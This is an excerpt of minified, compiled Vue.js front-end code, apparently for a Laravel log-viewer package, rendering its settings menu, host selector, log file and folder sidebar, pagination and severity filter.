					...
					Ga = (0, r.createElementVNode)("div", {
						class: "divider"
					}, null, -1),
					Za = ["innerHTML"],
					Ya = (0, r.createElementVNode)("div", {
						class: "divider"
					}, null, -1),
					Ja = {
						class: "w-4 h-4 mr-3 flex flex-col items-center"
					};
				const Qa = {
					...
					setup: function(e) {
						var t = Mi(),
							...
							o = (0, r.ref)(!1),
							i = function() {
								$i(window.location.href), o.value = !0, setTimeout((function() {
									return o.value = !1
								}), 2e3)
							};
								...
								return (0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(Co), {
									...
									default: (0, r.withCtx)((function() {
										return [(0, r.createVNode)((0, r.unref)(_o), {
											...
											default: (0, r.withCtx)((function() {
												return [Da, (0, r.createVNode)((0, r.unref)(Sa), {
													class: "w-5 h-5"
												})]
											})),
											_: 1
											...
											default: (0, r.withCtx)((function() {
												return [(0, r.createVNode)((0, r.unref)(Eo), {
													...
													default: (0, r.withCtx)((function() {
														return [(0, r.createElementVNode)("div", Ua, [$a, (0, r.createVNode)((0, r.unref)(xo), null, {
															default: (0, r.withCtx)((function(e) {
																var n = e.active;
																return [(0, r.createElementVNode)("button", {
																	class: (0, r.normalizeClass)([n ? "active" : ""]),
																	...
																	checked: (0, r.unref)(t).shorterStackTraces
																}, null, 8, ["checked"]), Ha], 2)]
															})),
															_: 1
														}), za, qa, (0, r.createVNode)((0, r.unref)(xo), {
															onClick: (0, r.withModifiers)((0, r.unref)(n).clearCacheForAllFiles, ["stop", "prevent"])
														}, {
															default: (0, r.withCtx)((function(e) {
																var t = e.active;
																return [(0, r.createElementVNode)("button", {
																	...
																	[r.vShow, !(0, r.unref)(n).clearingCache["*"]]
																]), (0, r.withDirectives)((0, r.createVNode)(Zi, {
																	class: "w-4 h-4 mr-1.5"
																}, null, 512), [
																	[r.vShow, (0, r.unref)(n).clearingCache["*"]]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Clear indices for all files", 512), [
																	[r.vShow, !(0, r.unref)(n).cacheRecentlyCleared["*"] && !(0, r.unref)(n).clearingCache["*"]]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Please wait...", 512), [
																	[r.vShow, !(0, r.unref)(n).cacheRecentlyCleared["*"] && (0, r.unref)(n).clearingCache["*"]]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", Wa, "File indices cleared", 512), [
																	[r.vShow, (0, r.unref)(n).cacheRecentlyCleared["*"]]
																])], 2)]
															})),
															_: 1
														}, 8, ["onClick"]), (0, r.createVNode)((0, r.unref)(xo), {
															onClick: (0, r.withModifiers)(i, ["stop", "prevent"])
														}, {
															default: (0, r.withCtx)((function(e) {
																var t = e.active;
																return [(0, r.createElementVNode)("button", {
																	class: (0, r.normalizeClass)([t ? "active" : ""])
																}, [(0, r.createVNode)((0, r.unref)(Oa), {
																	class: "w-4 h-4"
																}), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Share this page", 512), [
																	[r.vShow, !o.value]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", Ka, "Link copied!", 512), [
																	[r.vShow, o.value]
																])], 2)]
															})),
															_: 1
														}, 8, ["onClick"]), Ga, (0, r.createVNode)((0, r.unref)(xo), {
															...
															default: (0, r.withCtx)((function(e) {
																...
																return [(0, r.createElementVNode)("button", {
																	class: (0, r.normalizeClass)([n ? "active" : ""])
																}, [(0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Na), {
																	class: "w-4 h-4"
																}, null, 512), [
																	[r.vShow, (0, r.unref)(t).theme === (0, r.unref)(Ii).System]
																]), (0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Pa), {
																	class: "w-4 h-4"
																}, null, 512), [
																	[r.vShow, (0, r.unref)(t).theme === (0, r.unref)(Ii).Light]
																]), (0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Ta), {
																	class: "w-4 h-4"
																}, null, 512), [
																	[r.vShow, (0, r.unref)(t).theme === (0, r.unref)(Ii).Dark]
																]), (0, r.createElementVNode)("span", null, [(0, r.createTextVNode)("Theme: "), (0, r.createElementVNode)("span", {
																	innerHTML: (0, r.unref)(t).theme,
																	class: "font-semibold"
																}, null, 8, Za)])], 2)]
															})),
															_: 1
														}), (0, r.createVNode)((0, r.unref)(xo), null, {
															default: (0, r.withCtx)((function(e) {
																var n = e.active;
																return [(0, r.createElementVNode)("button", {
																	...
																	class: (0, r.normalizeClass)([n ? "active" : ""])
																}, [(0, r.createVNode)((0, r.unref)(Va), {
																	class: "w-4 h-4"
																}), (0, r.createTextVNode)(" Keyboard Shortcuts ")], 2)]
															})),
															_: 1
														}), (0, r.createVNode)((0, r.unref)(xo), null, {
															default: (0, r.withCtx)((function(e) {
																...
																return [(0, r.createElementVNode)("a", {
																	...
																	class: "w-4 h-4"
																}), (0, r.createTextVNode)(" Documentation ")], 2)]
															})),
															_: 1
														}), (0, r.createVNode)((0, r.unref)(xo), null, {
															default: (0, r.withCtx)((function(e) {
																...
																return [(0, r.createElementVNode)("a", {
																	...
																	class: "w-4 h-4"
																}), (0, r.createTextVNode)(" Help ")], 2)]
															})),
															_: 1
														}), Ya, (0, r.createVNode)((0, r.unref)(xo), null, {
															default: (0, r.withCtx)((function(e) {
																var t = e.active;
																return [(0, r.createElementVNode)("a", {
																	...
																	target: "_blank",
																	class: (0, r.normalizeClass)([t ? "active" : ""])
																}, [(0, r.createElementVNode)("div", Ja, [(0, r.createVNode)(Fa, {
																	class: "h-4 w-auto"
																})]), (0, r.createElementVNode)("strong", {
																	class: (0, r.normalizeClass)([t ? "text-white" : "text-brand-500"])
																}, "Show your support", 2), (0, r.createVNode)((0, r.unref)(Ra), {
																	class: "ml-2 w-4 h-4 opacity-75"
																})], 2)]
															})),
															_: 1
														})])]
				...
				var Xa = (e => (e[e.None = 1] = "None", e[e.Focusable = 2] = "Focusable", e[e.Hidden = 4] = "Hidden", e))(Xa || {});
				let el = (0, r.defineComponent)({
					name: "Hidden",
					props: {
						as: {
							type: [Object, String],
				...
				function rl(e, t, n) {
					if (Array.isArray(n))
						for (let [r, o] of n.entries()) rl(e, nl(t, r.toString()), o);
					else n instanceof Date ? e.push([t, n.toISOString()]) : "boolean" == typeof n ? e.push([t, n ? "1" : "0"]) : "string" == typeof n ? e.push([t, n]) : "number" == typeof n ? e.push([t, `${n}`]) : null == n ? e.push([t, ""]) : tl(n, t, e)
				}

				function ol(e, t) {
					return e === t
				}
				var il = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(il || {}),
					al = (e => (e[e.Single = 0] = "Single", e[e.Multi = 1] = "Multi", e))(al || {}),
					ll = (e => (e[e.Pointer = 0] = "Pointer", e[e.Other = 1] = "Other", e))(ll || {});
				let sl = Symbol("ListboxContext");

				function cl(e) {
					let t = (0, r.inject)(sl, null);
					if (null === t) {
				...
				let ul = (0, r.defineComponent)({
						...
						setup(e, {
							...
							function p(e = (e => e)) {
								let t = null !== f.value ? c.value[f.value] : null,
									n = co(e(c.value.slice()), (e => zr(e.dataRef.domRef))),
									r = t ? n.indexOf(t) : null;
								return -1 === r && (r = null), {
									options: n,
									activeOptionIndex: r
							...
							let h = (0, r.computed)((() => e.multiple ? 1 : 0)),
								[v, m] = function(e, t, n) {
								...
								g = {
									...
									search(t) {
										...
										let r = (null !== f.value ? c.value.slice(f.value + n).concat(c.value.slice(0, f.value + n)) : c.value).find((e => e.dataRef.textValue.startsWith(u.value) && !e.dataRef.disabled)),
											o = r ? c.value.indexOf(r) : -1; - 1 === o || o === f.value || (f.value = o, d.value = 1)
									},
									clearSearch() {
									...
									select(t) {
										e.disabled || m(Tr(h.value, {
											0: () => t,
											1: () => {
												let e = (0, r.toRaw)(g.value.value).slice(),
													n = (0, r.toRaw)(t),
							...
							}), (0, r.computed)((() => 0 === i.value))), (0, r.provide)(sl, g), Yr((0, r.computed)((() => Tr(i.value, {
								0: Gr.Open,
								1: Gr.Closed
							}))));
							let y = (0, r.computed)((() => {
							...
							return (0, r.onMounted)((() => {
								...
								return (0, r.h)(r.Fragment, [...null != o && null != v.value ? tl({
									[o]: v.value
								}).map((([e, t]) => (0, r.h)(el, function(e) {
									...
									theirProps: {
										...n,
										...Mr(s, ["defaultValue", "onUpdate:modelValue", "horizontal", "multiple", "by"])
									},
									slot: c,
									slots: t,
									attrs: n,
					...
					fl = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-listbox-label-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
							...
							let r = cl("ListboxLabel");

							function o() {
								var e;
								null == (e = zr(r.buttonRef)) || e.focus({
									preventScroll: !0
								})
							}
							return () => {
								let i = {
										open: 0 === r.listboxState.value,
					...
					dl = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-listbox-button-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
								...
								switch (e.key) {
									...
									case Ur.ArrowDown:
										e.preventDefault(), i.openListbox(), (0, r.nextTick)((() => {
											var e;
											null == (e = zr(i.optionsRef)) || e.focus({
												preventScroll: !0
											}), i.value.value || i.goToOption($r.First)
										}));
										break;
									case Ur.ArrowUp:
										e.preventDefault(), i.openListbox(), (0, r.nextTick)((() => {
											...
											null == (e = zr(i.optionsRef)) || e.focus({
												preventScroll: !0
											}), i.value.value || i.goToOption($r.Last)
										}))
								}
							}
							...
							function s(e) {
								i.disabled.value || (0 === i.listboxState.value ? (i.closeListbox(), (0, r.nextTick)((() => {
									...
									var e;
									return null == (e = zr(i.optionsRef)) ? void 0 : e.focus({
										preventScroll: !0
									})
								}))))
							}
					...
					pl = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-listbox-options-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
							...
							function l(e) {
								switch (a.value && clearTimeout(a.value), e.key) {
									...
									case Ur.Enter:
										...
										break;
									case Tr(i.orientation.value, {
										vertical: Ur.ArrowDown,
										horizontal: Ur.ArrowRight
									}):
										return e.preventDefault(), e.stopPropagation(), i.goToOption($r.Next);
									case Tr(i.orientation.value, {
										vertical: Ur.ArrowUp,
										horizontal: Ur.ArrowLeft
									}):
					...
					hl = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-listbox.option-${Dr()}`
							}
						},
						setup(e, {
							slots: t,
				...
				const bl = {
						...
						setup: function(e) {
							...
							return (0, r.watch)((function() {
									...
									Hi(t, "host", null != e && e.is_remote ? e.identifier : null)
								})),
								function(e, t) {
									return (0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(ul), {
										as: "div",
										...
										default: (0, r.withCtx)((function() {
											return [(0, r.createVNode)((0, r.unref)(fl), {
												...
												_: 1
											}), (0, r.createElementVNode)("div", ml, [(0, r.createVNode)((0, r.unref)(dl), {
												...
												default: (0, r.withCtx)((function() {
													var e;
													return [(0, r.createElementVNode)("span", gl, (0, r.toDisplayString)((null === (e = (0, r.unref)(n).selectedHost) || void 0 === e ? void 0 : e.name) || "Please select a server"), 1), (0, r.createElementVNode)("span", yl, [(0, r.createVNode)((0, r.unref)(vl), {
												...
												default: (0, r.withCtx)((function() {
													return [(0, r.createVNode)((0, r.unref)(pl), {
														...
														default: (0, r.withCtx)((function() {
															return [((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, null, (0, r.renderList)((0, r.unref)(n).hosts, (function(e) {
																return (0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(hl), {
																	as: "template",
																	key: e.identifier,
																	value: e.identifier
																}, {
																	default: (0, r.withCtx)((function(t) {
																		var n = t.active,
																			o = t.selected;
																		return [(0, r.createElementVNode)("li", {
																			class: (0, r.normalizeClass)([n ? "text-white bg-brand-600" : "text-gray-900 dark:text-gray-300", "relative cursor-default select-none py-2 pl-3 pr-9"])
																		}, [(0, r.createElementVNode)("span", {
																			class: (0, r.normalizeClass)([o ? "font-semibold" : "font-normal", "block truncate"])
																		}, (0, r.toDisplayString)(e.name), 3), o ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", {
																			key: 0,
																			class: (0, r.normalizeClass)([n ? "text-white" : "text-brand-600", "absolute inset-y-0 right-0 flex items-center pr-4"])
																		}, [(0, r.createVNode)((0, r.unref)(La), {
																			class: "h-5 w-5",
																			"aria-hidden": "true"
					...
					function w(e, t) {
						function o(r, i, a, l) {
							...
							if ("throw" !== s.type) {
								var c = s.arg,
									f = c.value;
								return f && "object" == Cl(f) && n.call(f, "__await") ? t.resolve(f.__await).then((function(e) {
									o("next", e, a, l)
								}), (function(e) {
									o("throw", e, a, l)
								})) : t.resolve(f).then((function(e) {
				...
				var kl = {
						class: "flex flex-col h-full py-5"
					},
					Sl = {
						class: "mx-3 md:mx-0 mb-1"
					},
					Ol = {
					...
					Tl = {
						class: "md:hidden flex-1 flex justify-end"
					},
					Vl = {
						type: "button",
						class: "menu-button"
					...
					jl = (0, r.createElementVNode)("code", {
						class: "font-mono px-2 py-1 bg-gray-100 dark:bg-gray-900 rounded"
					}, "php artisan log-viewer:publish", -1),
					Bl = {
						key: 2,
						class: "flex justify-between items-baseline mt-6"
					},
					Il = {
						class: "ml-1 block text-sm text-gray-500 dark:text-gray-400 truncate"
					},
					Ml = {
						class: "text-sm text-gray-500 dark:text-gray-400"
					},
					Fl = (0, r.createElementVNode)("label", {
						for: "file-sort-direction",
						class: "sr-only"
					}, "Sort direction", -1),
					Dl = [(0, r.createElementVNode)("option", {
						value: "desc"
					}, "Newest first", -1), (0, r.createElementVNode)("option", {
						value: "asc"
					}, "Oldest first", -1)],
					Ul = {
						key: 3,
						class: "mx-1 mt-1 text-red-600 text-xs"
					},
					$l = (0, r.createElementVNode)("p", {
						class: "text-sm text-gray-600 dark:text-gray-400"
					}, "Please select files to delete and confirm or cancel deletion.", -1),
					Hl = ["onClick"],
					zl = {
					...
					Yl = {
						class: "file-icon group-hover:hidden group-focus:hidden"
					},
					Jl = {
						class: "file-icon hidden group-hover:inline-block group-focus:inline-block"
					},
					Ql = {
						class: "file-name"
					},
					...
					es = (0, r.createElementVNode)("span", {
						class: "text-gray-500 dark:text-gray-400"
					}, "root", -1),
					ts = {
						key: 1
					},
					ns = (0, r.createElementVNode)("span", {
						class: "sr-only"
					}, "Open folder options", -1),
					rs = {
						class: "py-2"
					},
					os = {
					...
					us = (0, r.createElementVNode)("p", {
						class: "mb-5"
					}, "No log files were found.", -1),
					fs = {
						class: "flex items-center justify-center px-1"
					},
					ds = (0, r.createElementVNode)("div", {
					...
					ps = {
						class: "absolute inset-y-0 left-3 right-7 lg:left-0 lg:right-0 z-10"
					},
					hs = {
				...
				const vs = {
						...
						setup: function(e) {
									...
									var e = xl(_l().mark((function e() {
										return _l().wrap((function(e) {
											for (;;) switch (e.prev = e.next) {
												...
												case 3:
													return i.filesChecked.includes(i.selectedFileIdentifier) && Hi(t, "file", null), i.resetChecks(), e.next = 7, i.loadFolders();
												case 7:
												case "end":
													return e.stop()
											}
							...
							return (0, r.onMounted)(xl(_l().mark((function e() {
									return _l().wrap((function(e) {
										for (;;) switch (e.prev = e.next) {
											case 0:
								...
								function(e, a) {
									var f, d;
									return (0, r.openBlock)(), (0, r.createElementBlock)("nav", kl, [(0, r.createElementVNode)("div", Sl, [(0, r.createElementVNode)("div", Ol, [(0, r.createElementVNode)("h1", Nl, [(0, r.createTextVNode)(" Log Viewer "), Pl, (0, r.createElementVNode)("span", Tl, [(0, r.createVNode)(Qa, {
										class: "ml-2"
									}), (0, r.createElementVNode)("button", Vl, [(0, r.createVNode)((0, r.unref)(ko), {
										class: "w-5 h-5 ml-2",
										onClick: (0, r.unref)(i).toggleSidebar
									}, null, 8, ["onClick"])])])]), e.LogViewer.back_to_system_url ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", Rl, [(0, r.createElementVNode)("a", {
									...
									}, [(0, r.createVNode)((0, r.unref)(So), {
										class: "h-3 w-3 mr-1.5"
									}), (0, r.createTextVNode)(" " + (0, r.toDisplayString)(e.LogViewer.back_to_system_label || "Back to ".concat(e.LogViewer.app_name)), 1)], 8, Ll)])) : (0, r.createCommentVNode)("", !0)]), e.LogViewer.assets_outdated ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", Al, [(0, r.createVNode)((0, r.unref)(Oo), {
										class: "h-4 w-4 mr-1 inline"
									}), (0, r.createTextVNode)(" Front-end assets are outdated. To update, please run "), jl])) : (0, r.createCommentVNode)("", !0), (0, r.unref)(o).supportsHosts && (0, r.unref)(o).hasRemoteHosts ? ((0, r.openBlock)(), (0, r.createBlock)(wl, {
										key: 1,
										class: "mb-8 mt-6"
									})) : (0, r.createCommentVNode)("", !0), (null === (f = (0, r.unref)(i).folders) || void 0 === f ? void 0 : f.length) > 0 ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", Bl, [(0, r.createElementVNode)("div", Il, "Log files on " + (0, r.toDisplayString)(null === (d = (0, r.unref)(i).selectedHost) || void 0 === d ? void 0 : d.name), 1), (0, r.createElementVNode)("div", Ml, [Fl, (0, r.withDirectives)((0, r.createElementVNode)("select", {
										...
										[r.vModelSelect, (0, r.unref)(i).direction]
									])])])) : (0, r.createCommentVNode)("", !0), (0, r.unref)(i).error ? ((0, r.openBlock)(), (0, r.createElementBlock)("p", Ul, (0, r.toDisplayString)((0, r.unref)(i).error), 1)) : (0, r.createCommentVNode)("", !0)]), (0, r.withDirectives)((0, r.createElementVNode)("div", null, [$l, (0, r.createElementVNode)("div", {
										class: (0, r.normalizeClass)(["grid grid-flow-col pr-4 mt-2", [(0, r.unref)(i).hasFilesChecked ? "justify-between" : "justify-end"]])
									}, [(0, r.withDirectives)((0, r.createElementVNode)("button", {
										onClick: (0, r.withModifiers)(u, ["stop"]),
										class: "button inline-flex"
									}, [(0, r.createVNode)((0, r.unref)(No), {
										class: "w-5 mr-1"
									}), (0, r.createTextVNode)(" Delete selected files ")], 8, Hl), [
										[r.vShow, (0, r.unref)(i).hasFilesChecked]
									]), (0, r.createElementVNode)("button", {
										class: "button inline-flex",
										onClick: a[1] || (a[1] = (0, r.withModifiers)((function(e) {
											return (0, r.unref)(i).resetChecks()
										}), ["stop"]))
									}, [(0, r.createTextVNode)(" Cancel "), (0, r.createVNode)((0, r.unref)(ko), {
										class: "w-5 ml-1"
									})])], 2)], 512), [
										[r.vShow, (0, r.unref)(i).checkBoxesVisibility]
									]), (0, r.createElementVNode)("div", zl, [(0, r.createElementVNode)("div", {
										class: "file-list",
										onScroll: a[6] || (a[6] = function(e) {
											return (0, r.unref)(i).onScroll(e)
										})
									}, [((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, null, (0, r.renderList)((0, r.unref)(i).folders, (function(e) {
										return (0, r.openBlock)(), (0, r.createElementBlock)("div", {
											key: e.identifier,
											...
											default: (0, r.withCtx)((function(t) {
												...
												return [(0, r.createElementVNode)("div", {
												...
												}, [(0, r.createElementVNode)("div", Kl, [(0, r.createElementVNode)("button", {
													class: "file-item-info group",
													onKeydown: a[2] || (a[2] = function() {
														return (0, r.unref)(aa) && (0, r.unref)(aa).apply(void 0, arguments)
													})
												}, [(0, r.unref)(i).isOpen(e) ? (0, r.createCommentVNode)("", !0) : ((0, r.openBlock)(), (0, r.createElementBlock)("span", Gl, "Open folder")), (0, r.unref)(i).isOpen(e) ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", Zl, "Close folder")) : (0, r.createCommentVNode)("", !0), (0, r.createElementVNode)("span", Yl, [(0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Po), {
													class: "w-5 h-5"
												}, null, 512), [
													[r.vShow, !(0, r.unref)(i).isOpen(e)]
												]), (0, r.withDirectives)((0, r.createVNode)((0, r.unref)(To), {
													class: "w-5 h-5"
												}, null, 512), [
													[r.vShow, (0, r.unref)(i).isOpen(e)]
												])]), (0, r.createElementVNode)("span", Jl, [(0, r.createVNode)((0, r.unref)(Vo), {
													class: (0, r.normalizeClass)([(0, r.unref)(i).isOpen(e) ? "rotate-90" : "", "transition duration-100"])
												}, null, 8, ["class"])]), (0, r.createElementVNode)("span", Ql, [String(e.clean_path || "").startsWith("root") ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", Xl, [es, (0, r.createTextVNode)((0, r.toDisplayString)(String(e.clean_path).substring(4)), 1)])) : ((0, r.openBlock)(), (0, r.createElementBlock)("span", ts, (0, r.toDisplayString)(e.clean_path), 1))])], 32), (0, r.createVNode)((0, r.unref)(_o), {
													as: "button",
													class: "file-dropdown-toggle group-hover:border-brand-600 group-hover:dark:border-brand-800",
													...
													default: (0, r.withCtx)((function() {
														return [ns, (0, r.createVNode)((0, r.unref)(Ro), {
															class: "w-4 h-4 pointer-events-none"
														})]
													})),
													_: 2
													...
													default: (0, r.withCtx)((function() {
														return [(0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Eo), {
															static: "",
															as: "div",
															class: (0, r.normalizeClass)(["dropdown w-48", [(0, r.unref)(l)[e.identifier]]])
														}, {
															default: (0, r.withCtx)((function() {
																return [(0, r.createElementVNode)("div", rs, [(0, r.createVNode)((0, r.unref)(xo), {
																	...
																	default: (0, r.withCtx)((function(t) {
																		...
																		return [(0, r.createElementVNode)("button", {
																			...
																			[r.vShow, !(0, r.unref)(i).clearingCache[e.identifier]]
																		]), (0, r.withDirectives)((0, r.createVNode)(Zi, {
																			class: "w-4 h-4 mr-2"
																		}, null, 512), [
																			[r.vShow, (0, r.unref)(i).clearingCache[e.identifier]]
																		]), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Clear indices", 512), [
																			[r.vShow, !(0, r.unref)(i).cacheRecentlyCleared[e.identifier] && !(0, r.unref)(i).clearingCache[e.identifier]]
																		]), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Clearing...", 512), [
																			[r.vShow, !(0, r.unref)(i).cacheRecentlyCleared[e.identifier] && (0, r.unref)(i).clearingCache[e.identifier]]
																		]), (0, r.withDirectives)((0, r.createElementVNode)("span", os, "Indices cleared", 512), [
																			[r.vShow, (0, r.unref)(i).cacheRecentlyCleared[e.identifier]]
																		])], 2)]
																	})),
																	_: 2
																}, 1032, ["onClick"]), e.can_download ? ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(xo), {
																	key: 0
																}, {
																	default: (0, r.withCtx)((function(t) {
																		var n = t.active;
																		return [(0, r.createElementVNode)("a", {
																			href: e.download_url,
																			download: "",
																			onClick: a[4] || (a[4] = (0, r.withModifiers)((function() {}), ["stop"])),
																			class: (0, r.normalizeClass)([n ? "active" : ""])
																		}, [(0, r.createVNode)((0, r.unref)(Ao), {
																			class: "w-4 h-4 mr-2"
																		}), (0, r.createTextVNode)(" Download ")], 10, is)]
																	})),
																	_: 2
																}, 1024)) : (0, r.createCommentVNode)("", !0), e.can_delete ? ((0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, {
																	key: 1
																}, [as, (0, r.createVNode)((0, r.unref)(xo), null, {
																	default: (0, r.withCtx)((function(t) {
																		var n = t.active;
																		return [(0, r.createElementVNode)("button", {
																			onClick: (0, r.withModifiers)((function(t) {
																			...
																			class: (0, r.normalizeClass)([n ? "active" : ""])
																		}, [(0, r.withDirectives)((0, r.createVNode)((0, r.unref)(No), {
																			class: "w-4 h-4 mr-2"
																		}, null, 512), [
																			[r.vShow, !(0, r.unref)(i).deleting[e.identifier]]
																		]), (0, r.withDirectives)((0, r.createVNode)(Zi, null, null, 512), [
																			[r.vShow, (0, r.unref)(i).deleting[e.identifier]]
																		]), (0, r.createTextVNode)(" Delete ")], 10, ls)]
																	})),
																	_: 2
											...
											_: 2
										}, 1024), (0, r.withDirectives)((0, r.createElementVNode)("div", ss, [((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, null, (0, r.renderList)(e.files || [], (function(e) {
											return (0, r.openBlock)(), (0, r.createBlock)(ka, {
												key: e.identifier,
												"log-file": e,
												onClick: function(r) {
													return o = e.identifier, void(n.query.file && n.query.file === o ? Hi(t, "file", null) : Hi(t, "file", o));
													var o
												}
									...
									})), 128)), 0 === (0, r.unref)(i).folders.length ? ((0, r.openBlock)(), (0, r.createElementBlock)("div", cs, [us, (0, r.createElementVNode)("div", fs, [(0, r.createElementVNode)("button", {
									...
									}, [(0, r.createVNode)((0, r.unref)(jo), {
										class: "w-4 h-4 mr-1.5"
									}), (0, r.createTextVNode)(" Refresh file list ")])])])) : (0, r.createCommentVNode)("", !0)], 32), ds, (0, r.withDirectives)((0, r.createElementVNode)("div", ps, [(0, r.createElementVNode)("div", hs, [(0, r.createVNode)(Zi, {
										class: "w-14 h-14"
									})])], 512), [
										[r.vShow, (0, r.unref)(i).loading]
									])])])
								}
						}
					},
				...
				var gs = n(598),
					...
					Ss = ["disabled"],
					Os = (0, r.createElementVNode)("span", {
						class: "sm:hidden"
					}, "Previous page", -1),
					Ns = {
					...
					As = ["disabled"],
					js = (0, r.createElementVNode)("span", {
						class: "sm:hidden"
					}, "Next page", -1);
				const Bs = {
						__name: "Pagination",
						...
						setup: function(e) {
							var t = Li(),
								...
								i = ((0, r.computed)((function() {
									...
									e < 1 && (e = 1), t.pagination && e > t.pagination.last_page && (e = t.pagination.last_page), Hi(n, "page", e > 1 ? Number(e) : null)
								}),
								a = function() {
									return i(t.page + 1)
								},
							...
							return function(n, o) {
								return (0, r.openBlock)(), (0, r.createElementBlock)("nav", xs, [(0, r.createElementVNode)("div", ks, [1 !== (0, r.unref)(t).page ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
									key: 0,
									onClick: l,
									disabled: e.loading,
									rel: "prev"
									...
									class: "h-5 w-5"
								}), Os], 8, Ss)) : (0, r.createCommentVNode)("", !0)]), (0, r.createElementVNode)("div", Ns, [(0, r.createElementVNode)("span", null, (0, r.toDisplayString)((0, r.unref)(t).page), 1)]), (0, r.createElementVNode)("div", Ps, [((0, r.openBlock)(!0), (0, r.createElementBlock)(r.Fragment, null, (0, r.renderList)(e.short ? (0, r.unref)(t).linksShort : (0, r.unref)(t).links, (function(e) {
									return (0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, null, [e.active ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", Ts, (0, r.toDisplayString)(Number(e.label).toLocaleString()), 1)) : "..." === e.label ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", Vs, (0, r.toDisplayString)(e.label), 1)) : ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
										key: 2,
										onClick: function(t) {
									...
									}, (0, r.toDisplayString)(Number(e.label).toLocaleString()), 9, Rs))], 64)
								})), 256))]), (0, r.createElementVNode)("div", Ls, [(0, r.unref)(t).hasMorePages ? ((0, r.openBlock)(), (0, r.createElementBlock)("button", {
									key: 0,
									onClick: a,
									disabled: e.loading,
									rel: "next"
								}, [js, (0, r.createVNode)((0, r.unref)(Es), {
									class: "h-5 w-5"
								})], 8, As)) : (0, r.createCommentVNode)("", !0)])])
							}
						}
					},
					Is = Bs;
				var Ms = n(246),
					...
					Zs = {
						class: "flex-1 inline-flex justify-between"
					},
					Ys = {
						class: "log-count"
					};
				const Js = {
					...
					setup: function(e) {
						var t = Mi(),
							n = ji();
						return (0, r.watch)((function() {
								return n.selectedLevels
							}), (function() {
								return t.loadLogs()
							})),
							function(e, o) {
								return (0, r.openBlock)(), (0, r.createElementBlock)("div", Fs, [(0, r.createVNode)((0, r.unref)(Co), {
									as: "div",
									...
									default: (0, r.withCtx)((function() {
										return [(0, r.createVNode)((0, r.unref)(_o), {
											...
											default: (0, r.withCtx)((function() {
												return [(0, r.unref)(n).levelsSelected.length > 2 ? ((0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, {
													key: 0
												}, [(0, r.createElementVNode)("span", Ds, (0, r.toDisplayString)((0, r.unref)(n).totalResultsSelected.toLocaleString() + ((0, r.unref)(t).hasMoreResults ? "+" : "")) + " entries in", 1), (0, r.createElementVNode)("strong", Us, (0, r.toDisplayString)((0, r.unref)(n).levelsSelected[0].level_name) + " + " + (0, r.toDisplayString)((0, r.unref)(n).levelsSelected.length - 1) + " more", 1)], 64)) : (0, r.unref)(n).levelsSelected.length > 0 ? ((0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, {
													key: 1
												}, [(0, r.createElementVNode)("span", $s, (0, r.toDisplayString)((0, r.unref)(n).totalResultsSelected.toLocaleString() + ((0, r.unref)(t).hasMoreResults ? "+" : "")) + " entries in", 1), (0, r.createElementVNode)("strong", Hs, (0, r.toDisplayString)((0, r.unref)(n).levelsSelected.map((function(e) {
													return e.level_name
												})).join(", ")), 1)], 64)) : (0, r.unref)(n).levelsFound.length > 0 ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", zs, (0, r.toDisplayString)((0, r.unref)(n).totalResults.toLocaleString() + ((0, r.unref)(t).hasMoreResults ? "+" : "")) + " entries found. None selected", 1)) : ((0, r.openBlock)(), (0, r.createElementBlock)("span", qs, "No entries found")), (0, r.createVNode)((0, r.unref)(Ms), {
													class: "w-4 h-4"
												})]
											})),
											_: 1
											...
											default: (0, r.withCtx)((function() {
												return [(0, r.createVNode)((0, r.unref)(Eo), {
													...
													default: (0, r.withCtx)((function() {
														return [(0, r.createElementVNode)("div", Ws, [(0, r.createElementVNode)("div", Ks, [(0, r.createTextVNode)(" Severity "), (0, r.unref)(n).levelsFound.length > 0 ? ((0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, {
															key: 0
														}, [(0, r.unref)(n).levelsSelected.length === (0, r.unref)(n).levelsFound.length ? ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(xo), {
															key: 0,
															...
															default: (0, r.withCtx)((function(e) {
																var t = e.active;
																return [(0, r.createElementVNode)("a", {
